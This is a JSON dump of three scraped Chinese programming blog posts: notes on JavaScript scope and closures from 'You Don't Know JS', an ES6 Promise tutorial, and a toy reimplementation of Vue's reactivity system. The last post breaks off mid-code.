{"_id":{"$oid":"5a4f5f6218646e1ee8be98f5"},"id":"5a4dfd336fb9a04529372de7","author":{"$oid":"5a4e17dee8405d2778beac7d"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/4/160c0a4f377c06b6?w=1360\u0026h=535\u0026f=png\u0026s=522677"],"screenShot":null}],"title":"你不知道的JavaScript","meta":{"likeCount":0},"tag":["JavaScript"],"comment":[],"shortContent":"最近在看《你不知道的JavaScript》这本书上卷，看书的过程中，有一个很明显的感觉就是自己懂得太少。JavaScript既是一门充满吸引力，简单易用的语言，又是一门具有较多复杂微妙技术的语言。本着知其然知其所以然的精神，我对读完这本书做了一个简单的总结，不过很多东西要反复琢…","content":"\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0a4f377c06b6?w=1360\u0026amp;h=535\u0026amp;f=png\u0026amp;s=522677\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e前言\u003c/h2\u003e\n\u003cp\u003e  最近在看《你不知道的JavaScript》这本书上卷，看书的过程中，有一个很明显的感觉就是自己懂得太少。JavaScript既是一门充满吸引力，简单易用的语言，又是一门具有较多复杂微妙技术的语言。本着知其然知其所以然的精神，我对读完这本书做了一个简单的总结，不过很多东西要反复琢磨才能真正理解。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e1. 作用域是什么？\u003c/h3\u003e\n\u003cp\u003e 作用域是一套规则，用于确定在何处以及如何查找变量(标识符)。如果查找的目的是对变量的赋值，那么就会使用LHS查询；如果目的是获取变量的值，就会使用就会使用RHS查询。赋值操作符会导致LHS查询,=操作符或调用函数时传入参数的操作都会导致关联作用域的赋值操作。\n \u003c/p\u003e\n\u003cp\u003e像var = 2这样的声明会被分解两个独立的步骤\u003c/p\u003e\n\u003cp\u003e1.首先，var a在其作用域声明新变量，这是在最开始的阶段，也就是代码执行前进行\u003c/p\u003e\n\u003cp\u003e2.接着，a = 2会查询(LHS查询)变量a并对其赋值\nLHS和RHS查询都会在当前执行作用域开始，如果有需要，就会向上级作用域继续查找目标标识符，这样每次上升一级作用域，最后抵达全局作用域，无论找到或没找到都将停止\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e什么是LHS和RHS?\u003c/h4\u003e\n\u003cp\u003eLHS和RHS的含义是赋值操作的左侧或右侧，但并不意味就是\"=赋值操作符的左侧或右侧\"\nLHS可以理解为赋值操作的目标是谁。RHS可以理解为谁是赋值操作的源头\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e2. 词法作用域\u003c/h3\u003e\n\u003cp\u003e词法作用域是定义在词法阶段的作用域。换句话说，词法作用域是由你在写代码时将变量和块作用域写在哪里决定的，因此词法分析器处理代码时会保持作用域不变\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e foo(a){\n  var b = a*2;\n  \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e bar(c){\n    console.log(a,b,c)\n  }\n  bar(b*3)\n}\nfoo(2)//2,4,12\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在上面的例子中有三个逐级嵌套的作用域\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e包含整个的全局作用域，其中有一个标识符:foo\u003c/li\u003e\n\u003cli\u003e包含foo所创建的作用域，其中有三个标识符:a,bar和b\u003c/li\u003e\n\u003cli\u003e包含bar所创建的作用域，其中只有一个标识符：c\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 class=\"heading\"\u003e3. let\u003c/h3\u003e\n\u003cp\u003e  let关键字可以变量绑定到所在的任意作用域中(通常是{..}的内部，换句话说，let为其声明的变量隐式地了所在的块作用域\n使用let进行的声明不会在块作用域中进行提升。声明的代码被运行之前，声明并不“存在”\n例如\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003econsole.log(bar);//ReferenceError\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e bar = 2 ;\n\u003c/code\u003e\u003c/pre\u003e\u003ch4 class=\"heading\"\u003elet的for循环\u003c/h4\u003e\n\u003cp\u003efor循环头部的let不仅将i绑定到for循环中，事实上它将其重新绑定到了循环的每一个迭代中，确保使用上一个循环迭代结束时的值重新进行赋值\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e j;\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(j=0; j\u0026lt;10;j++){\n  \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i = j;//每个迭代重新绑定\n  console.log(i)\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003elet声明附属于一个新的作用域而不是当前的函数作用域\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e4. const\u003c/h3\u003e\n\u003cp\u003econst也可以创建块作用域变量，但是其值是固定的(常量\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar foo = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (foo){\n  var a = 2;\n  const b = 3; //包含在\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e中的块作用域常量\n\n  a = 3;//正常\n  b = 4;//错误\n}\nconsole.log(a);//3\nconsole.log(b);//ReferenceError\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e  函数是javaScript中最常见的作用域单元。但函数不是唯一的作用域单元，块作用域指的是变量和反函数不仅可以属于所在的作用域，也可予以属于某个代码块（通常指{..}内部）\n从ES6引入了let关键字(var关键字的表亲)，用来在任意代码块中声明变量，if(..){let a = 2}会声明一个劫持了if的{..}块的变量，并且将变量加到这个块中\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e5. 作用域闭包\u003c/h3\u003e\n\u003cp\u003e闭包是基于词法作用域书写代码时所产生的自然结果\n下面一段代码，清晰的展示了闭包\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efoo\u003c/span\u003e\u003c/span\u003e(){\n  var a = 2;\n  \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003ebar\u003c/span\u003e\u003c/span\u003e(){\n    console.log(a);\n  }\n  \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e bar;\n}\nvar baz = foo();\nbaz();//2 这就是闭包的效果\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e  函数bar()的词法作用域能访问到foo()的内部作用域，然后我们把bar()函数本身当做一个值类型进行传递，在这个例子中bar所引用的函数对象本身当作返回值bar()显然可以被正常运行。但它是在自己定义的词法作用域以外的地执行\n在foo()执行后，通常期待foo()的整个作用域后被销毁。而闭包的\"神奇\"之处就是阻止这件事情的发生。事实上内部作用域依然存在，bar()本身在使用。\u003c/p\u003e\n\u003cp\u003e  拜bar()所声明的位置所赐，它拥有涵盖foo()内部作用域的闭包，使得该作用域能够一直存活，以供bar()在之后的任何时间进行引用\nbar()依然持有对该作用域的引用，而这个引用就叫做闭包\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ewait\u003c/span\u003e(message){\n  \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003etimer\u003c/span\u003e\u003c/span\u003e(){\n    console.log(message);\n    },1000);\n}\n\u003cspan class=\"hljs-built_in\"\u003ewait\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"hello,closure!\"\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e  将一个内部函数(名为timer)传递给setTimeout(..).timer具有涵盖wait(..)作用域的闭包,因此还保有对变量message的引用\nwait(..)执行1000毫秒后，它的内部作用域并不会消失，timer函数依然保有wait(..)作用域的闭包，这就是闭包。\u003c/p\u003e\n\u003cp\u003e未完待续。。。。。。\u003c/p\u003e\n","buildTime":"1515151186.4377","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be98f9"},"id":"5a4e0338f265da430703b127","author":{"$oid":"5a4f5f6218646e1ee8be98f0"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/4/160c0c06627217f2?w=497\u0026h=425\u0026f=png\u0026s=28305"],"screenShot":null}],"title":"ES6 Promise介绍","meta":{"likeCount":0},"tag":[],"comment":[],"shortContent":"这种回调地狱嵌套层级多了，代码结构就容易变得很不直观，可读性比较差。 Promise 是 ES6原生支持的，把原来嵌套的回调改为了级联的方式。 注意，这种状态的改变只会出现从未完成态向完成态或失败态转化，不能逆反。完成态和失败态不能互相转化，而且，状态一旦转化，将不能更改。 只…","content":"\u003cul\u003e\n\u003cli\u003e作者：Leo晓华\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1 class=\"heading\"\u003e回调地狱\u003c/h1\u003e\n\u003cp\u003e由于 JavaScript 的单线程性质，我们必须等待上一个请求返回结果后才能处理下一步，如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$.ajax({ \n  url: \u003cspan class=\"hljs-string\"\u003e\"/step1\"\u003c/span\u003e, \n  success: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n      $.ajax({ \n        url: \u003cspan class=\"hljs-string\"\u003e\"/step2\"\u003c/span\u003e, \n        success: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n            $.ajax({ \n              url: \u003cspan class=\"hljs-string\"\u003e\"/step3\"\u003c/span\u003e, \n              success: \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n\n              }\n            });\n        }\n      });\n  }\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这种回调地狱嵌套层级多了，代码结构就容易变得很不直观，可读性比较差。\u003cbr\u003e\nPromise 是 ES6原生支持的，把原来嵌套的回调改为了级联的方式。\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003e了解Promise\u003c/h1\u003e\n\u003cp\u003ePromise 可以简单理解为一个事务，这个事务存在三种状态：\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160c0c06627217f2?w=497\u0026amp;h=425\u0026amp;f=png\u0026amp;s=28305\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e已经完成了 resolved（完成态）\u003c/li\u003e\n\u003cli\u003e因为某种原因被中断了 rejected（失败态）\u003c/li\u003e\n\u003cli\u003e初始状态 pending（未完成）\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e注意，这种状态的改变只会出现从未完成态向完成态或失败态转化，不能逆反。完成态和失败态不能互相转化，而且，状态一旦转化，将不能更改。\u003c/p\u003e\n\u003cp\u003e只有异步操作的结果可以决定当前是哪一种状态，任何其他操作都无法改变这个状态。这也是Promise这个名字的由来，它的英语意思是承诺，表示其他手段无法改变。\u003c/p\u003e\n\u003cp\u003e例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar p = new Promise(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (resolve, reject) {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(/* 异步操作成功 */){\n        resolve(ret);\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        reject(error);\n    }\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在声明一个Promise对象实例时，我们传入的匿名函数参数中：\u003cbr\u003e\nresolve 就对应着完成态之后的操作\u003cbr\u003e\nreject 对应着失败态之后的操作\u003c/p\u003e\n\u003ch1 class=\"heading\"\u003ePromise的then方法\u003c/h1\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003ep.then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (value) {\n    // 完成态，value是上面resolve传入的值\n}, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (error) {\n    // 失败态，error是上面reject传入的值\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003ethen()方法传递的两个参数中:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e第一个参数（函数）对应着完成态的操作，也就是resolve时调用\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e第二个参数（函数）对应着失败态的操作，也就是reject时调用\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e第二个参数可以没有\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch1 class=\"heading\"\u003e多个promise链式\u003c/h1\u003e\n\u003cp\u003e例子1：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar p1 = new Promise((resolve, reject) =\u0026gt; {\n    \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(() =\u0026gt; resolve(\u003cspan class=\"hljs-string\"\u003e'p1'\u003c/span\u003e), 1000);\n});\n\np1.then( ret =\u0026gt; {\n    console.log(ret); //p1\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e'then1'\u003c/span\u003e;\n}).then( ret =\u0026gt; {\n    console.log(ret); //\u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e1\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e'then2'\u003c/span\u003e;\n}).then( ret =\u0026gt; {\n    console.log(ret); //\u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e2\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e在 resolve 之前，promise 的每一个 then 都会将回调函数压入队列，resolve 后，将 resolve 的值送给队列的第一个函数，第一个函数执行完毕后，将执行结果再送入下一个函数，依次执行完队列。一连串下来，一气呵成，没有丝毫间断。\u003cbr\u003e\n链式中的then方法（第二个开始），它们的resolve中的参数是什么？答案就是前一个then()中resolve的return语句的返回值。\u003c/p\u003e\n\u003cp\u003e例子2：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    step1:\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e(){\n        var promise = new Promise(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(resolve,reject){\n             $.ajax({\n                url:\u003cspan class=\"hljs-string\"\u003e\"/step1\"\u003c/span\u003e,\n                    success:\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(data){\n                        resolve(data)//在异步操作成功时调用\n                    }\n            });\n        })\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e promise;\n    },\n    step2:\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(val){\n        var promise = new Promise(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(resolve,reject){\n            $.ajax({\n                url:\u003cspan class=\"hljs-string\"\u003e\"/step2\"\u003c/span\u003e,\n                    data:val,   //来自step1的参数\n                    success:\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(data){\n                        resolve(data)//在异步操作成功时调用\n                    }\n                });\n            })\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e promise;\n        }\n    step1()\n    .then(data =\u0026gt; \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e step2(data))  //step1的结果传给step2作为参数\n    .then(data =\u0026gt; console.log(data))\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 class=\"heading\"\u003e错误处理\u003c/h1\u003e\n\u003cp\u003e方法1：由then的第二个处理函数处理错误\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar p = new Promise(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (resolve, reject) {\n    // ...\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(/* 异步操作成功 */){\n        resolve(ret);\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        reject(error);\n    }\n});\n\np.then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (value) {\n    // 完成态\n}, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (error) {\n    // 失败态\n});\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e方法2：链式错误处理 （catch 方法）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar p = new Promise(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (resolve, reject) {\n    // ...\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(/* 异步操作成功 */){\n        resolve(ret);\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        reject(error);\n    }\n});\n\np.then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (value) {\n    // 完成态\n}).then(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (value) {\n    // 完成态\n}).catch( err =\u0026gt; {// 可以捕抓到前面的出现的错误。\n    console.log(err.toString());\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如果第一个then报错，第二个then不会执行。\u003c/p\u003e\n\u003cp\u003e一个活动项目的例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e//查用户信息\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003equerymystate\u003c/span\u003e\u003c/span\u003e(){\n    var promise = new Promise(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(resolve,reject){\n        utils.get(\u003cspan class=\"hljs-string\"\u003e'/querystate'\u003c/span\u003e, {\n          raffle_code:xxx,\n        }, (rst) =\u0026gt; {\n          \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (rst.return_code === 0) { //成功获取用户信息\n                resolve(rst.data);                        \n          } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e { //获取失败\n              reject(rst.error_message);    \n          }\n        })    \n    })    \n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e promise;\n},\n//我要领奖，必须先获取用户信息\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003egetAward\u003c/span\u003e\u003c/span\u003e(){\n    querymystate()\n    .then(data =\u0026gt; {\n      //领奖处理\n    }).catch(ErrMsg =\u0026gt; {\n      //弹出错误提示ErrMsg\n    })\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 class=\"heading\"\u003ePromise.all()\u003c/h1\u003e\n\u003cp\u003ePromise.all()方法用于将多个Promise实例，包装成一个新的Promise实例，例如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003evar p = Promise.all([p1, p2, p3]);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e新的Promise实例p的状态由p1, p2, p3决定：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e当p1, p2, p3的状态都为完成态时，p为完成态。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ep1, p2, p3中任一一个状态为失败态，则p为失败态。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e例子：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e a = new Promise((resolve, reject) =\u0026gt; { \n    \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(() =\u0026gt; { \n      resolve(2) \n    }, 2000) \n  }) \n\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e b = new Promise((resolve, reject) =\u0026gt; { \n    \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(() =\u0026gt; { \n      resolve(3) \n    }, 2000) \n  }) \n\nPromise.all([a, b])\n.then( (ret) =\u0026gt; console.log(ret)) //2秒后，注意这里返回的是数组 [2,3]\n.catch( err =\u0026gt; console.log(err.toString()));\n\u003c/code\u003e\u003c/pre\u003e\u003ch1 class=\"heading\"\u003ePromise.race()\u003c/h1\u003e\n\u003cp\u003erace意思是赛跑，看谁先到。只要p1, p2, p3中任意一个实例率先改变状态，则p的状态就跟着改变，而且状态由率先改变的实例决定。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e a = new Promise((resolve, reject) =\u0026gt; { \n    \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(() =\u0026gt; { \n      resolve(2) \n    }, 3000) \n  }) \n\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e b = new Promise((resolve, reject) =\u0026gt; { \n    \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(() =\u0026gt; { \n      resolve(3) \n    }, 2000) \n  }) \n\nPromise.race([a, b])\n.then( (ret) =\u0026gt; console.log(ret)) //2秒后显示3\n.catch( err =\u0026gt; console.log(err.toString()));\n\u003c/code\u003e\u003c/pre\u003e","buildTime":"1515149811.476","__v":0}
{"_id":{"$oid":"5a4f5f6218646e1ee8be98fa"},"id":"5a4df4965188252a3d386ae6","author":{"$oid":"5a4b765a751bf823c002e910"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"vue小实现","meta":{"likeCount":0},"tag":["Vue.js","前端","前端框架"],"comment":[],"shortContent":"不管读再多的文档，感觉还是自己写(抄)一遍记得牢。。 先实现一个小目标，text和text2能在页面上呈现出来，在实现一个大点的，2秒后和3秒后页面中的文本改变。 下面要干的第一步是将new Vue实例时传入的参数处理下。怎么个处理法？例如：我们的text和text2属性是放到…","content":"\u003cp\u003e不管读再多的文档，感觉还是自己写(抄)一遍记得牢。。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e实现目标\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    var demo = new Vue({\n        el: \u003cspan class=\"hljs-string\"\u003e'#demo'\u003c/span\u003e,\n        data: {\n            text: \u003cspan class=\"hljs-string\"\u003e\"before change text\"\u003c/span\u003e,\n            text2: \u003cspan class=\"hljs-string\"\u003e\"before change text2\"\u003c/span\u003e,\n        },\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003erender\u003c/span\u003e\u003c/span\u003e() {\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e this.__h__(\u003cspan class=\"hljs-string\"\u003e'div'\u003c/span\u003e, {}, [\n                this.__h__(\u003cspan class=\"hljs-string\"\u003e'span'\u003c/span\u003e, {}, [this.__toString__(this.text)]),\n                this.__h__(\u003cspan class=\"hljs-string\"\u003e'span'\u003c/span\u003e, {}, [this.__toString__(this.text2)])\n            ])\n        }\n    })\n\n    \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n        demo.text = \u003cspan class=\"hljs-string\"\u003e\"after change text\"\u003c/span\u003e\n        demo.text2 = \u003cspan class=\"hljs-string\"\u003e\"after change text2\"\u003c/span\u003e\n    }, 2000)\n\n    \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e() {\n        demo.text = \u003cspan class=\"hljs-string\"\u003e\"after after change text\"\u003c/span\u003e\n        demo.text2 = \u003cspan class=\"hljs-string\"\u003e\"after after change text2\"\u003c/span\u003e\n    }, 3000)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e先实现一个小目标，text和text2能在页面上呈现出来，在实现一个大点的，2秒后和3秒后页面中的文本改变。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e模拟一个Vue的构造函数\u003c/h2\u003e\n\u003cp\u003e底板先摆出来：\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eclass Vue {\n    constructor(options) {\n        先将传入的data参数放到实例的_data属性上以供调用\n        this._data = options.data\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e下面要干的第一步是将new Vue实例时传入的参数处理下。怎么个处理法？例如：我们的text和text2属性是放到_data这个属性上的，那么调用的时候可能就要写demo._data.text。这样写太复杂，不如demo.text方便。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    constructor(options) {\n        this.\u003cspan class=\"hljs-variable\"\u003e$options\u003c/span\u003e = options\n        this._data = options.data\n        Object.keys(options.data).forEach(key =\u0026gt; this._proxy(key))\n    }\n\n    _proxy(key) {\n        const self = this\n        Object.defineProperty(self, key, {\n            configurable: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n            enumerable: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n            get: \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eproxyGetter\u003c/span\u003e\u003c/span\u003e() {\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e self._data[key]\n            },\n            \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e: \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e proxySetter(val) {\n                self._data[key] = val\n            }\n        })\n    }\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接下来就是实现数据与页面绑定的关键了===\u0026gt;defineReactive方法。按照观察者模式，我们希望知道text和text2是否被调用，如果他们被调用，那么当他们改变的时候我们就需要重新刷新页面了。恰好，Object.defineProperty就提供对象被调用或被改变的回调。那么class Dep是用来干嘛的呢，简单的说是为了收集依赖：当vue遍历data的参数时，会在每次循环的函数闭包中生成一个Dep的实例，可以认为每个参数(text和text2)都有一个对应的Dep实例，当text或者text2被调用(即get()方法被调用)时，会将注册的事件(也就是代码里的Dep.target)添加到Dep实例的subs数组里，然后当text或者text2改变时，取出subs数组里收集到的订阅事件，然后循环执行所有的订阅。这样就实现了data改变到页面刷新的自动过程。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e    constructor(options) {\n        ...\n        observer(options.data)\n    }\n\n    \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e observer(value, cb) {\n        Object.keys(value).forEach((key) =\u0026gt; defineReactive(value, key, value[key], cb))\n    }\n\n    \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e defineReactive(obj, key, val, cb) {\n        // 每个属性都创建了一个dep实例，所以update方法被添加到了各自的dep.subs数组里\n        const dep = new Dep()\n        Object.defineProperty(obj, key, {\n            enumerable: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n            configurable: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n            get: () =\u0026gt; {\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (Dep.target) {\n                    dep.add(Dep.target)\n                }\n                \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e val\n            },\n            \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e: newVal =\u0026gt; {\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (newVal === val)\n                    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e\n                val = newVal\n                dep.notify()\n            }\n        })\n    }\n\n    class Dep {\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003econstructor\u003c/span\u003e\u003c/span\u003e() {\n            this.subs = []\n        }\n        add(cb) {\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(this.subs.indexOf(cb) === -1) {\n                console.log(\u003cspan class=\"hljs-string\"\u003e'被添加到监听了'\u003c/span\u003e)\n                this.subs.push(cb)\n            }\n        }\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003enotify\u003c/span\u003e\u003c/span\u003e() {\n            console.log(\u003cspan class=\"hljs-string\"\u003e'notify被触发了'\u003c/span\u003e)\n            this.subs.forEach((cb) =\u0026gt; cb())\n        }\n    